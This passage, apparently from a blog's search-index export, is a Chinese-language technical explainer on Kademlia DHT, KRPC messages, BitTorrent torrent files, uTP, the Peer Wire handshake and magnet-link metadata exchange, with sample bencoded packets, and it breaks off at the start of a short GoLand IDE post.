d1:rd2:id20:0123456789abcdefghij5:nodes9:def456...e1:t2:aa1:y1:re\n```\n\nfind_node 请求包含 2 个参数，第一个参数是 id，包含了请求节点的ID。第二个参数是 target，包含了请求者正在查找的节点的ID\n\t\n当一个节点接收到了 find_node 的请求，他应该给出对应的回复，回复中包含 2 个关键字 id(被请求节点的id) 和 nodes，nodes 是字符串类型，包含了被请求节点的路由表中最接近目标节点的 K(8) 个最接近的节点的联系信息(被请求方每次都统一返回最靠近目标节点的节点列表K捅)\n\t\n```\n参数: {\"id\" : \"<querying nodes id>\", \"target\" : \"<id of target node>\"}\n回复: {\"id\" : \"<queried nodes id>\", \"nodes\" : \"<compact node info>\"}\n```\n\n这里要明确3个概念:\n\t\n1. 请求方的id: 发起这个DHT节点寻址的节点自身的ID，可以类比DNS查询中的客户端\n2. 目标target id: 需要查询的目标ID号，可以类比于DNS查询中的URL，这个ID在整个递归查询中是一直不变的\n3. 被请求节点的id: 在节点的递归查询中，请求方由远及近不断询问整个链路上的节点，沿途的每个节点在返回时都要带上自己的id号\n\n\t\n+ <font color=\"red\"> get_peers: 获取 infohash 的 peers</font>\n\n\n1. get_peers 请求包含 2 个参数(id请求节点ID，info_hash代表torrent文件的infohash，infohash为种子文件的SHA1哈希值，也就是磁力链接的btih值)\n\n2. response get_peer: \n\n\t1) 如果被请求的节点有对应 info_hash 的 peers，他将返回一个关键字 values，这是一个列表类型的字符串。每一个字符串包含了 \"CompactIP-address/portinfo\" 格式的 peers 信息(即对应的机器ip/port信息)(peer的info信息和DHT节点的info信息是一样的)\n\n\t2) 如果被请求的节点没有这个 infohash 的 peers，那么他将返回关键字 nodes(需要注意的是，如果该节点没有对应的infohash信息，而只是返回了nodes，则请求方会认为该节点是一个\"可疑节点\"，则会从自己的路由表K捅中删除该节点)，这个关键字包含了被请求节点的路由表中离 info_hash 最近的 K 个节点(我这里没有该节点，去别的节点试试运气)，使用 \"Compactnodeinfo\" 格式回复。在这两种情况下，关键字 token 都将被返回。token 关键字在今后的 annouce_peer 请求中必须要携带。token 是一个短的二进制字符串\n\n\t\n```\n参数: {\"id\" : \"<querying nodes id>\", \"info_hash\" : \"<20-byte infohash of target torrent>\"}\n\t\n回复: \n{\"id\" : \"<queried nodes id>\", \"token\" :\"<opaque write token>\", \"values\" : [\"<peer 1 info string>\", \"<peer 2 info string>\"]}\n或: \t\n{\"id\" : \"<queried nodes id>\", \"token\" :\"<opaque write token>\", \"nodes\" : \"<compact node info>\"}\n```\n\n+ <font color=\"red\"> announce_peer: 这个请求用来表明发出 announce_peer 请求的节点，正在某个端口下载 torrent 文件</font>\n\nannounce_peer 包含 4 个参数\n\t\n```\n1. 第一个参数是 id: 包含了请求节点的 ID\n2. 第二个参数是 info_hash: 包含了 torrent 文件的 infohash\n3. 第三个参数是 port: 包含了整型的端口号，表明 peer 在哪个端口下载\n4. 第四个参数数是 token: 这是在之前的 get_peers 请求中收到的回复中包含的。收到 announce_peer 请求的节点必须检查这个 token 与之前我们回复给这个节点 get_peers 的 token 是否相同(也就说，所有下载者/发布者都要参与检测新加入的发布者是否伪造了该资源，但是这个机制有一个问题，如果最开始的那个发布者就伪造，则整条链路都是一个伪造的错的资源infohash信息了)\n如果相同，那么被请求的节点将记录发送 announce_peer 节点的 IP 和请求中包含的 port 端口号在 peer 联系信息中对应的 infohash 下，这意味着一个一个事实: 当前这个资源有一个新的peer提供者了，下一次有其他节点希望或者这个资源的时候，会把这个新的(前一次请求下载资源的节点)也当作一个peer返回给请求者，这样，资源的提供者就越来越多，资源共享速度就越来越快\n```\n\n一个peer正在下载某个资源，意味着该peer有能够访问到该资源的渠道，且该peer本地是有这份资源的全部或部分拷贝的，它需要向DHT网络广播announce消息，告诉其他节点这个资源的下载地址\n\t\n```\narguments:  {\"id\" : \"<querying nodes id>\",\n\"implied_port\": <0 or 1>,\n\"info_hash\" : \"<20-byte infohash of target torrent>\",\n\"port\" : <port number>,\n\"token\" : \"<opaque token>\"}\n\t\nresponse: {\"id\" : \"<queried nodes id>\"}\n```\n\n报文包例子 Example Packets \n\t\n```\nannounce_peers Query = {\"t\":\"aa\", \"y\":\"q\", \"q\":\"announce_peer\", \"a\": {\"id\":\"abcdefghij0123456789\", \"implied_port\": 1, \"info_hash\":\"mnopqrstuvwxyz123456\", \"port\": 6881, \"token\": \"aoeusnth\"}}\nbencoded = d1:ad2:id20:abcdefghij01234567899:info_hash20:<br />\nmnopqrstuvwxyz1234564:porti6881e5:token8:aoeusnthe1:q13:announce_peer1:t2:aa1:y1:qe\n\t\nResponse = {\"t\":\"aa\", \"y\":\"r\", \"r\": {\"id\":\"mnopqrstuvwxyz123456\"}}\nbencoded = d1:rd2:id20:mnopqrstuvwxyz123456e1:t2:aa1:y1:re\n```\n\n### 0x3: 回复 Responses\n\n回复 Responses的包已经在上面的Query里说明了\n\n\n### 0x4: 错误 Errors\n\n错误包例子 Example Error Packets\n\n```\ngeneric error = {\"t\":\"aa\", \"y\":\"e\", \"e\":[201, \"A Generic Error Ocurred\"]}\nbencoded = d1:eli201e23:A Generic Error Ocurrede1:t2:aa1:y1:ee\n```\n\n\n# 3. BitTorrent协议\n\nBitTorrent 使用\"分布式哈希表\"(DHT)来为无 tracker 的种子(torrents)存储 peer 之间的联系信息。这样每个 peer 都成了 tracker。这个协议基于 Kademila 网络并且在 UDP 上实现\n\n\n```\n1. \"peer\" 是在一个 TCP 端口上监听的客户端/服务器，它实现了 BitTorrent 协议 \n2. \"节点\" 是在一个 UDP 端口上监听的客户端/服务器，它实现了 DHT(分布式哈希表) 协议 \nDHT 由节点组成，它存储了 peer 的位置。BitTorrent 客户端包含一个 DHT 节点，这个节点用来联系 DHT 中其他节点，从而得到 peer 的位置，进而通过 BitTorrent 协议下载 \n```\n\n\n每个节点有一个全局唯一的标识符，作为 \"node ID\"。节点 ID 是一个随机选择的 160bit(20字节) 空间，BitTorrent infohash 也使用这样的 160bit 空间。\"距离\"用来比较两个节点 ID 之间或者节点 ID 和 infohash 之间的\"远近\"(节点和节点、节点和文件之间的距离)。节点必须维护一个路由表，路由表中含有一部分其它节点的联系信息。其它节点距离自己越近时，路由表信息越详细。因此每个节点都知道 DHT 中离自己很\"近\"的节点的联系信息，而离自己非常远的 ID 的联系信息却知道的很少 \n在 Kademlia 网络中，距离是通过异或(XOR)计算的，结果为无符号整数。distance(A, B) = |A xor B|，值越小表示越近\n\n\n\n1. 当节点要为 torrent(种子文件) 寻找 peer(保存了目标资源的IP) 时，它将自己路由表中的节点 ID 和 torrent 的 infohash(资源HASH) 进行\"距离对比\"(节点和目标文件的距离)，然后向路由表中离 infohash 最近的节点发送请求，问它们正在下载这个 torrent 的 peer 的联系信息\n\n2. 因为资源HASH和节点HASH都共用一套20bytes的命名空间，所以DHT节点充当了peer节点的\"代理\"的工作，我们不能直接向peer节点发起资源获取请求(即使这个peer节点确实存储了我们的目标资源)，因为peer节点本身不具备处理P2P request/response能力的，我们需要借助DHT的能力，让DHT告诉我们哪个peer节点保存了我们想要的资源或者哪个DHT节点可能知道从而递归地继续去问那个DHT网络\n\n3. 如果一个被联系的节点知道下载这个 torrent 的 peer 信息，那个 peer 的联系信息将被回复给当前节点。否则，那个被联系的节点则必须回复在它的路由表中离该 torrent 的 infohash 最近的节点的联系信息，(`get_peers`)\n\n4. 最初的节点重复地请求比目标 infohash 更近的节点，直到不能再找到更近的节点为止\n\n5. 查询完了之后，客户端把自己作为一个 peer 插入到所有回复节点中离种子最近的那个节点中，这一步背后的含义是: 我之前是请求这个资源的人，我们现在获取到资源了，我在下载这个文件的同时，我也要充当一个新的peer来向其他的客户端贡献自己的文件共享，这样，当另外的其他客户端在发起新的请求的时候，DHT节点就有可能把当前客户端对应的peer返回给新的请求方，这样不断发展下去，这个资源的热度就越来越热，下载速度也越来越快(`announce_peer`)\n\n6. 请求 peer 的返回值包含一个不透明的值，称之为\"令牌(token)\"\n\n7. 如果一个节点宣布它所控制的 peer 正在下载一个种子(即该节点拥有该文件资源)，它必须在回复请求节点的同时，附加上对方向我们发送的最近的\"令牌(token)\"。这样当一个节点试图\"宣布\"正在下载一个种子时，被请求的节点核对令牌和发出请求的节点的 IP 地址。这是为了防止恶意的主机登记其它主机的种子。由于令牌仅仅由请求节点返回给收到令牌的同一个节点，所以没有规定他的具体实现。但是令牌必须在一个规定的时间内被接受，超时后令牌则失效。在 BitTorrent 的实现中，token 是在 IP 地址后面连接一个 secret(通常是一个随机数)，这个 secret 每五分钟改变一次，其中 token 在十分钟以内是可接受的\n\n\n这种握手验证的原理是:\n\n> 请求方生成一个随机值，跟着我的请求发给被请求方，被请求方回复的时候要带上这个随机值，那请求方就知道，你是我刚才想请求的那个人\n\n### 0x1: 路由表 Routing Table\n\n\n1. 每个节点维护一个路由表保存已知的好节点。路由表中的节点是用来作为在 DHT 中请求的起始点。路由表中的节点是在不断的向其他节点请求过程中，对方节点回复的。即DHT中的K桶中的节点，当我们请求一个目标资源的时候，我们根据HASH XOR从自己的K桶中选择最有可能知道该资源的节点发起请求，而被请求的节点也不一定知道目标资源所在的peer，这个时候被请求方会返回一个新的\"它认为可能知道这个peer的节点\"，请求方收到这个新的节点后，会把这个节点保存进自己的K桶内，然后继续发起请求，直到找到目标资源所在的peer为止\n\n2. 并不是我们在请求过程中收到的节点都是平等的，有的节点是好的，而另一些则不是。许多使用 DHT 协议的节点都可以发送请求并接收回复，但是不能主动回复其他节点的请求，这种节点被称之为\"坏节点\"\n\n3. 节点的路由表只包含已知的好节点，这很重要。好节点是指在过去的 15 分钟以内，曾经对我们的某一个请求给出过回复的节点(存活好节点)，或者曾经对我们的请求给出过一个回复(不用在15分钟以内)，并且在过去的 15 分钟给我们发送过请求。上述两种情况都可将节点视为好节点。在 15 分钟之后，对方没有上述 2种情况发生，这个节点将变为可疑的。当节点不能给我们的一系列请求给出回复时，这个节点将变为坏的。相比那些未知状态的节点，已知的好节点会被给于更高的优先级。(看源码确实是这样的)\n\n\t> 这就反过来告诉我们，如果我们要做DHT嗅探，我们的嗅探器除了要能够发出FIND_NODE请求及接收返回之外，还需要能够响应其他节点发来的请求(`get_peers/announce_peer`)，这样才不会被其他节点列入\"可疑\"甚至\"坏节点\"列表中\n\n4. 路由表覆盖从 0 到 2^160 全部的节点 ID 空间。路由表又被划分为桶(bucket)，每个桶包含一部分的 ID 空间。空的路由表只有一个桶，它的 ID 范围从 min=0 到 max=2^160。当 ID 为 N 的节点插入到表中时，它将被放到 ID 范围在 min <= N < max 的 桶 中\n\n5. 空的路由表只有一个桶，所以所有的节点都将被放到这个桶中。每个桶最多只能保存 K 个节点，当前 K=8。当一个桶放满了好节点之后，将不再允许新的节点加入，除非我们自身的节点 ID 在这个桶的范围内。在这样的情况下，这个桶将被分裂为 2 个新的桶，每个新桶的范围都是原来旧桶的一半。原来旧桶中的节点将被重新分配到这两个新的桶中。如果一个新表只有一个桶，这个包含整个范围的桶将总被分裂为 2 个新的桶，每个桶的覆盖范围从 0..2^159 和 2^159..2^160  以log2N的方式不断分裂，类似于Kademlia中的K桶机制\n\n6. 当桶装满了好节点，新的节点会被丢弃。一旦桶中的某个节点变为了坏的节点，那么我们就用新的节点来替换这个坏的节点。如果桶中有在 15 分钟内都没有活跃过的节点，我们将这样的节点视为可疑的节点，这时我们向最久没有联系的节点发送 ping。如果被 ping 的节点给出了回复，那么我们向下一个可疑的节点发送 ping，不断这样循环下去，直到有某一个节点没有给出 ping 的回复，或者当前桶中的所有节点都是好的(也就是所有节点都不是可疑节点，他们在过去 15 分钟内都有活动)。如果桶中的某个节点没有对我们的 ping 给出回复，我们最好再试一次(再发送一次 ping，因为这个节点也许仍然是活跃的，但由于网络拥塞，所以发生了丢包现象，注意 DHT 的包都是 UDP 的)，而不是立即丢弃这个节点或者直接用新节点来替代它。这样，我们得路由表将充满稳定的长时间在线的节点 \n\n7. 每个桶都应该维持一个 lastchange 字段来表明桶中节点的\"新鲜\"度。当桶中的节点被 ping 并给出了回复，或者一个节点被加入到了桶，或者一个节点被新的节点所替代，桶的 lastchange 字段都应当被更新。如果一个桶的 lastchange 在过去的 15 分钟内都没有变化，那么我们将更新它。这个更新桶操作是这样完成的\n\n\t+ 从这个桶所覆盖的范围中随机选择一个 ID，并对这个 ID 执行 find_nodes 查找操作。\n\t+ 常常收到请求的节点通常不需要常常更新自己的桶, 反之，不常常收到请求的节点常常需要周期性的执行更新所有桶的操作，这样才能保证当我们用到 DHT 的时候，里面有足够多的好的节点 \n\n8. 在插入第一个节点到路由表并启动服务后，这个节点应试着查找 DHT 中离自己更近的节点，这个查找工作是通过不断的发出 find_node 消息给越来越近的节点来完成的，当不能找到更近的节点时，这个扩散工作就结束了\n\n9. 路由表应当被启动工作和客户端软件保存(也就是启动的时候从客户端中读取路由表信息，结束的时候客户端软件记录到文件中)\n\n\n### 0x2: BitTorrent 协议扩展 BitTorrent Protocol Extension\n\n\nBitTorrent 协议已经被扩展为可以在通过 tracker 得到的 peer 之间互相交换节点的 UDP 端口号(也就是告诉对方我们的 DHT 服务端口号)，在这样的方式下，客户端可以通过下载普通的种子文件来自动扩展 DHT 路由表(我直接知道某个节点有某一个资源)。新安装的客户端第一次试着下载一个无 tracker 的种子时，它的路由表中将没有任何节点，这是它需要在 torrent 文件中找到联系信息\n\n\n1. peers 如果支持 DHT 协议就将 BitTorrent 协议握手消息的保留位的第 8 字节的最后一位置为 1\n2. 这时如果 peer 收到一个 handshake 表明对方支持 DHT 协议，就应该发送 PORT 消息。它由字节 0x09 开始，payload 的长度是 2 个字节，包含了这个 peer 的 DHT 服务使用的网络字节序的 UDP 端口号\n3. 当 peer 收到这样的消息时应当向对方的 IP 和消息中指定的端口号的节点发送 ping\n4. 如果收到了 ping 的回复，那么应当使用上述的方法将新节点的联系信息加入到路由表中 \n\n### 0x3: Torrent 文件扩展 Torrent File Extensions(种子文件)\n\n一个无 tracker 的 torrent 文件字典不包含 announce 关键字，而使用 nodes 关键字来替代。这个关键字对应的内容应该设置为 torrent 创建者的路由表中 K 个最接近的节点(可供选择的)，这个关键字也可以设置为一个已知的可用节点(这意味着接收到这个种子文件的客户端能够向这些节点发出解析请求，询问资源的所在位置)，比如这个 torrent 文件的创建者.\n\n请不要自动加入 router.bittorrent.com 到 torrent 文件中或者自动加入这个节点到客户端路由表中。这里可以仔细思考一下，这么做还有另一个好处，这个对等网络可以保持无中心化，对于外部新加入的新节点来说，它可以不用通过\"中心引导节点\"来加入网络，隐藏了\"中心引导节点\"的存在，增强了对等网络的隐蔽性\n\n\nbt 种子文件是使用 bencode 编码的，整个文件就 dictionary，包含以下键\n\n```\n1. info(dictinary): 必选, 表示该bt种子文件的文件信息 \n    1) 文件信息包括文件的公共部分\n        1.1) piece length(integer): 必选, 每一数据块的长度\n        1.2) pieces(string): 必选, 所有数据块的 SHA1 校验值\n        1.3) publisher(string):    可选, 发布者\n        1.4) publisher.utf-8(string): 可选, 发布者的 UTF-8 编码\n        1.5) publisher-url(string): 可选, 发布者的 URL\n        1.6) publisher-url.utf-8(string): 可选, 发布者的 URL 的 UTF-8 编码\n    2) 如果 bt 种子包含的是单个文件，包含以下内容\n        2.1) name(string): 必选, 推荐的文件名称\n        2.2) name.utf-8(string): 可选, 推荐的文件名称的 UTF-8 编码\n        2.3) length(int): 必选，文件的长度单位是字节\n    3) 如果是多文件，则包含以下部分:\n        3.1) name(string): 必选, 推荐的文件夹名称\n        3.2) name.utf-8(string): 可选, 推荐的文件名称的 UTF-8 编码\n        3.3) files(list): 必选, 文件列表，每个文件列表下面是包括每一个文件的信息，文件信息是个字典 \n    4) 文件字典\n        4.1) length(int): 必选，文件的长度单位是字节\n        4.2) path(string): 必选，文件名称，包含文件夹在内\n        4.3) path.utf-8(string): 必选，文件名称 UTF-8 表示，包含文件夹在内\n        4.4) filehas(string): 可选，文件hash\n        4.5) ed2k(string): 可选, ed2k 信息 \n\n2. announce(string): 必选, tracker 服务器的地址\n3. announce-list(list): 可选, 可选的 tracker 服务器地址\n4. creation date(interger): 必选, 文件创建时间\n5. comment(string): 可选, bt 文件注释\n6. created by(string): 可选，文件创建者\n```\n\n<font color=\"red\">pieces是一个字符串，它的长度是20的倍数，每一段20个字符表示对应文件块的sha1 hash值。</font>\n\n\n\n\n这里要特别注意一点：磁力链接的infohash也是根据info字段来计算的，info字段的pieces为每个数据块的校验值，其作用是验证下载下来的文件是否正确，如果下载下来的文件块计算出来的SHA1值和pieces中的SHA1校验值不一致，该数据块要重新下载。 所以，我们可以看出根据磁力链接下载文件是分成两个步骤的\n\n1. 先根据infohash下载种子文件的info字段，种子文件并不是必须的，但是info字段却必不可少\n2. 然后根据infohash下载源文件，将下载的每一个数据块和info中的对应的SHA1校验码进行比较，不一致重新下载该数据块\n\n需要注意的是\n\n1. 一般的种子文件会包含announce，也就是tracker服务器的地址(trackerless是BTTorrent的趋势)\n2. 如果没有tracker服务器，文件中可能会包含nodes，nodes是存有种子信息的peer节点，这样的种子文件就是trackerless torrent。如果有nodes客户端直接从nodes获取种子信息\n3. <font color=\"red\">而从DHT网络中下载下来的种子文件既没有annouce也没有nodes，客户端只能通过info字段计算出hashinfo，再从bootstrap node节点开始在DHT网络中寻找种子信息</font>\n\n\nBT原生依靠Tracker，后来才加入dht\n\n\n# 4. uTP协议 \n\nuTP协议是一个基于UDP的开放的BT点对点文件共享协议。在uTP协议出现之前，BT下载会占用网络中大量的链接，直接导致其它网络应用服务质量下载和网络的拥堵，因此有很多ISP都开始限制BT的下载。uTP减轻了网络延迟并解决了传统的基于TCP的BT协议所遇到的拥塞控制问题，提供可靠的有序的传送。一个有效的uTP数据包包含下面格式的报头\n\n![1](Kademlia_DHT_KRPC_BitTorrent协议/2.png)\n\n\n1. type(包类型):\n\n\t```\n    1) ST_DATA = 0: 最重要的数据包，uTP就是使用该类型的包传送数据\n    2) ST_FIN = 1: 关闭连接，这是uTP连接的最后一个包，类似于TCP中的FIN\n    3) ST_STATE = 2: 简单的应答包，表明已从对方收到了数据包，该包不包含任何数据，seq_nr值不变\n    4) ST_RESET = 3: 终止连接，类似于TCP中的RST\n    5) ST_SYN = 4: 初始化连接，类似于TCP中的SYN，这是uTP连接的第一个包\n\t```\n2. ver: This is the protocol version. The current version is 1.\n3. extension: The type of the first extension in a linked list of extension headers. \n  \n    ```\n    1) 0 means no extension.\n    2) Selective acks: There is currently one extension:\n\t```\n\n4. `connection_id`: This is a random, unique, number identifying all the packets that belong to the same connection. Each socket has one connection ID for sending packets and a different connection ID for receiving packets. The endpoint initiating the connection decides which ID to use, and the return path has the same ID + 1.    \n\n\tuTP的一个很重要的特点是使用connection id来标识一次连接，而不是每个包算一次连接。所以在分析ST_DATA时，需要注意找所有connection id相同的数据包，然后按seq_nr排序，seq_nr应该是依次递增的(注意ST_STATE包不会增加seq_nr值)，如果发现两个ST_DATA的seq_nr值相同则说明后面那个报文是重复报文需要忽略掉，如果发现两个ST_DATA的seq_nr值不是连续的，中间差了一个或多个，则可能是由于网络原因发生了丢包现象，数据包将不可用\n\n5. `timestamp_microseconds`: This is the 'microseconds' parts of the timestamp of when this packet was sent. This is set using gettimeofday() on posix and QueryPerformanceTimer() on windows. The higher resolution this timestamp has, the better. The closer to the actual transmit time it is set, the better.\n\n6. `timestamp_difference_microseconds`: This is the difference between the local time and the timestamp in the last received packet, at the time the last packet was received. This is the latest one-way delay measurement of the link from the remote peer to the local machine. \nWhen a socket is newly opened and doesn't have any delay samples yet, this must be set to 0.\n\n7. wnd_size: Advertised receive window. This is 32 bits wide and specified in bytes. The window size is the number of bytes currently in-flight, i.e. sent but not acked. The advertised receive window lets the other end cap the window size if it cannot receive any faster, if its receive buffer is filling up. When sending packets, this should be set to the number of bytes left in the socket's receive buffer.\n\n8. seq_nr\n9. ack_nr\n\n在uTP连接建立之后，就开始传送需要的数据了。peer和peer之间传送数据也是遵循着一定的规范，就是Peer Wire协议。\n\n\n# 5. Peer Wire协议 \n\n在BitTorrent中，节点的寻址是通过DHT实现的，而实际的资源共享和传输则需要通过uTP以及Peer Wire协议来配合完成\n\n### 0x1: 握手\n\nPeer Wire协议是Peer之间的通信协议，通常由一个握手消息开始。握手消息的格式是这样的\n\n```\n<pstrlen><pstr><reserved><info_hash><peer_id> \n```\n\n在BitTorrent协议的v1.0版本, pstrlen = 19, pstr = \"BitTorrent protocol\"，info_hash是上文中提到的磁力链接中的btih，peer_id每个客户端都不一样，但是有着一定的规则，根据前面几个字符可以推断出客户端的类型\n\n```\n'AG' - Ares\n'A~' - Ares\n'AR' - Arctic\n'AV' - Avicora\n'AX' - BitPump\n'AZ' - Azureus\n'BB' - BitBuddy\n'BC' - BitComet\n'BF' - Bitflu\n'BG' - BTG (uses Rasterbar libtorrent)\n'BR' - BitRocket\n'BS' - BTSlave\n'BX' - ~Bittorrent X\n'CD' - Enhanced CTorrent\n'CT' - CTorrent\n'DE' - DelugeTorrent\n'DP' - Propagate Data Client\n'EB' - EBit\n'ES' - electric sheep\n'FT' - FoxTorrent\n'FX' - Freebox BitTorrent\n'GS' - GSTorrent\n'HL' - Halite\n'HN' - Hydranode\n'KG' - KGet\n'KT' - KTorrent\n'LH' - LH-ABC\n'LP' - Lphant\n'LT' - libtorrent\n'lt' - libTorrent\n'LW' - LimeWire\n'MO' - MonoTorrent\n'MP' - MooPolice\n'MR' - Miro\n'MT' - MoonlightTorrent\n'NX' - Net Transport\n'PD' - Pando\n'qB' - qBittorrent\n'QD' - QQDownload\n'QT' - Qt 4 Torrent example\n'RT' - Retriever\n'S~' - Shareaza alpha/beta\n'SB' - ~Swiftbit\n'SS' - SwarmScope\n'ST' - SymTorrent\n'st' - sharktorrent\n'SZ' - Shareaza\n'TN' - TorrentDotNET\n'TR' - Transmission\n'TS' - Torrentstorm\n'TT' - TuoTu\n'UL' - uLeecher!\n'UT' - µTorrent\n'VG' - Vagaa\n'WD' - WebTorrent Desktop\n'WT' - BitLet\n'WW' - WebTorrent\n'WY' - FireTorrent\n'XL' - Xunlei\n'XT' - XanTorrent\n'XX' - Xtorrent\n'ZT' - ZipTorrent\n```\n\nPeer Wire协议是在uTP协议基础上里层应用态协议。收到握手消息后，对方也会回复一个握手消息，并且开始协商一些基本的信息。\n\n\n# 6. BitTorrent协议扩展ut_metadata和ut_pex(Extension for Peers to Send Metadata Files) (磁力链接核心)\n\n```\nBEP:9 \t\tTitle:\tExtension for Peers to Send Metadata Files\nBEP:10 \t\tTitle:\tExtension Protocol\n```\n\n\n借助于DHT/KRPC完成了的Node节点寻址，资源对应的Peer获取，以及uTP以及Peer Wire完成握手之后，接下要就要\"动真格\"了，我们需要获取到目标资源的\"种子信息(infohash/filename/pieces分块sha1)\"了，<font color=\"red\">这个扩展的目的是为了在最初没有.torrent文件的情况仍然能够加入swarm并能够完成下载。这个扩展能让客户端从peer哪里下载metadata。这让支持magnet link成为了可能，magnet link是一个web页上的链接，仅仅包含了足够加入swarm的足够信息(info hash)</font>\n\n\n### 0x1: Metadata\n\n这个扩展仅仅传输.torrent文件的info-字典字段，这个部分可以由infohash来验证。在这篇文档中，.torrent的这个部分被称为metadata。\n\nMetadata被分块，每个块有16KB(16384字节)，Metadata块从0开始索引，所有快的大小都是16KB，除了最后一个块可能比16KB小\n\n\n### 0x2: Extension头部\n\nMetadata扩展使用extension协议(<font color=\"green\">__BEP0010__</font>)来声称它的存在。它在extension握手消息的头部m字典加入ut_metadata项。它标识了这个消息可以使用这个消息码，同时也可以在握手消息中加入metadata_size这个整型字段(不是在m字典中)来指定metadata的字节数\n\n```\n{'m': {'ut_metadata', 3}, 'metadata_size': 31235}\n```\n\n### 0x3: Extension消息\n\nExtension消息都是bencode编码，这里有3类不同的消息\n\n\n+ request 0: \n\n请求消息并不在字典中附加任何关键字，这个消息的回复应当来自支持这个扩展的peer，是一个reject或者data消息，回复必须和请求所指出的片相同\nPeer必须保证它所发送的每个片都通过了infohash的检测。即直到peer获得了整个metadata并通过了infohash的验证，才能够发送片(即一个peer应该保证自己已经完整从其他peer中拷贝了一份相同的资源文件后，才能继续响应其他节点的拷贝请求)。Peers没有获得整个metadata时，对收到的所有metadata请求都必须直接回复reject消息\n\n```\n{'msg_type': 0, 'piece': 0}\nd8:msg_typei0e5:piecei0ee\n# 这代表请求消息在请求metadata的第一片\n```\n\n+ data 1\n\n这个data消息需要在字典中添加一个新的字段，\"total_size\".这个关键字段和extension头的\"metadata_size\"有相同的含义，这是一个整型\n\nMetadata片被添加到bencode字典后面，他不是字典的一部分，但是是消息的一部分(必须包括长度前缀)。\n如果这个片是metadata的最后一个片，他可能小于16KB。如果它不是metadata的最后一片，那大小必须是16KB\n\n```\n{'msg_type': 1, 'piece': 0, 'total_size': 3425}\nd8:msg_typei1e5:piecei0e10:total_sizei34256eexxxxxxxx...\n# x表示二进制数据(metadata) \n```\n\n+ reject 2\n\nReject消息没有附件的关键字。它的意思是peer没有请求的这个metadata片信息 \n\n在客户端收到收到一定数目的消息后，可以通过拒绝请求消息来进行洪泛攻击保护。尤其在metadata的数目乘上一个因子时 \n\n```\n{'msg_type': 2, 'piece': 0}\nd8:msg_typei1e5:piecei0ee\n```\n\n### 0x4: request消息: Metadat信息获取过程\n\n+ 扩展支持交互(互相询问对方支持哪些扩展)\n\n根据BEP-010我们知道，扩展消息一般在Peer Wire握手之后立即发出，是一个B编码的字典\n\n```\n{\n    e: 0,\n    ipv4: xxx,\n    ipv6: xxx,\n    complete_ago: 1,\n    m:\n    {\n        upload_only: 3,\n        lt_donthave: 7,\n        ut_holepunch: 4,\n        ut_metadata: 2,\n        ut_pex: 1,\n        ut_comment: 6\n    },\n    matadata_size: 45377,\n    p: 33733,\n    reqq: 255,\n    v: BitTorrent 7.9.3\n    yp: 19616,\n    yourip: xxx\n}\n\n1. m: 是一个字典，表示客户端支持的所有扩展以及每个扩展的编号\n    1) ut_pex: 表示该客户端支持PEX(Peer Exchange)\n    2) ut_metadata表示支持BEP-009(也就是交换种子文件的metadata)\n```\n\n+ 握手handshake\n\n\n我们在完成双方握手之后，并且得到了对方支持的扩展信息。资源请求方也通知被请求方本机支持的扩展情况，然后后面接着一个扩展消息(从上面的m字典可以看到可能会有多种不同的扩展消息)，具体是哪个类型的扩展消息由message ID后面那个数字决定，这个数字对应着m字典中的编号。譬如我们这里的消息是\n\n```\n00 00 00 1b 14 02 ... 00 00 00 1b \n1. 消息长度为 0x1b (27 bytes) \n2. 14 表示是 扩展消息(0x14 = 20)\n3. 02 对应上面m字典中的 ut_metadata，所以我们这个消息是ut_metadata消息\n```\n\n\n再次看上图的截图，我们这里的图显示的是[msg_type: 0, piece: 2]正是request消息，意思是向对象请求第二个piece的数据，piece的意思是分块的意思，根据BEP-009我们知道，种子文件的metadata（也就是info部分）会按16KB分成若干块，除最后一块每一块的大小都是16KB，每一块从0开始按顺序进行编号。所以这个请求的意思就是向对象请求第三块的metadata\n\n\n\n+ 回复data信息\n\n\n从图中形象的表示可以看到torrent文件整个info的长度为45377，这个值正是上面握手报文后的扩展消息中的metadata_size的值。在发送request消息之后，接下来对方应该回复data消息（如果对方有数据）或reject消息（如果对方没有数据）。\n\n\nmsg_type为1表示是回复就是我所需要的数据，但是注意这里的数据并没完，由于uTP协议的缘故，我们可以根据connection id找到这个连接后续的所有数据。 这里其实一共收到了三个消息，我们分别来看一下\n\n```\n00 00 00 03 09 83 c5 --> message ID为9，port消息，表示端口号为0x83c5 = 33733\n00 00 00 03 14 03 01 --> message ID为20(0x14)，extend消息，编号03为upload_only，表示设置upload_only = 1\n00 00 31 70 14 02 xx --> message ID为20(0x14)，extend消息，编号02为ut_metadata，后面的xx表示[msg_type: 1, piece: 2, total_size: 45377]和相应块的metadata数据\n```\n\n\n看第三个消息可以知道消息长度为0x3170，这个长度包括了[msg_type...]这一串字符串的长度，共0x2f个字节，我们将其减去就得到了piece2的长度：0x3170 - 0x2f = 0x3141 我们上面说过每个块的大小应该是16KB，也就是0x4000，这里的大小为0x3141，只可能是最后一块。我们稍微计算验证下，将整个info的长度45377(0xb141)按16KB分块\n\n```\npiece 0: 0x0001 ~ 0x4000 长度0x4000\npiece 1: 0x4001 ~ 0x8000 长度0x4000\npiece 2: 0x8001 ~ 0xb141 长度0x3141\n```\n\n\n可以看到piece2正是最后一块，大小为0x3141。至此我们得到了第二块的metadata，然后通过request消息获取piece0和piece1获取第一和第二块的metadata，将三块的消息合并成torrent文件info字段，然后再加上create date、create by或comment等信息，种子文件就算完成下载了。<font color=\"red\">可见要在BT网络中完成实际的资源下载，就必须完整获取到种子文件，因为种子文件中不单有infohash值，还有piece sha1校验码，分块下载时需要进行校验，而磁力连接magnet只是一个最小化入口，最终还是需要通过磁力连接在DHT网络中获取种子文件的完整信息</font>\n\n\n\n### 0x5: 校验info_hash\n\n我们将从DHT网络中下载的种子文件和原始的种子文件进行比较，可以看到annouce和annouce-list字段都丢掉了(引入了DHT网络后，BT可以实现Trackerless)，create date发生了变化，info字段不变\n\n磁力链是为了简化BT种子文件的分发，封装了一个简化版的magnet url，客户端解析这个magnet磁力链之后，需要在DHT网络中寻找infohash对应的peer节点，获取节点成功后，向目标peer节点获取真正的BitTorrent种子(.torrent文件)信息(包含了完整的pieces SHA1杂凑信息)，另一个渠道就是传统的Bt种子论坛会分发.BT种子文件\n\n\n\n\n\n# 6. 参考资料\n\n+ https://www.cnblogs.com/LittleHann/p/6180296.html","tags":["dht"],"categories":["BitTorrent"]},{"title":"golang_ide_goland使用","url":"%2Fp%2F5a4d0049.html","content":"\n\n\n### 1. 保存文件自动 go fmt + go imports\n\ngo to preferences ->Tools ->File Watchers and enable go fmt . This way on each save it will format the file.\n\n\ngoland tools->filewatchers->go fmt| go imports\n\n<!-- more -->\n\n\n\n### 2. 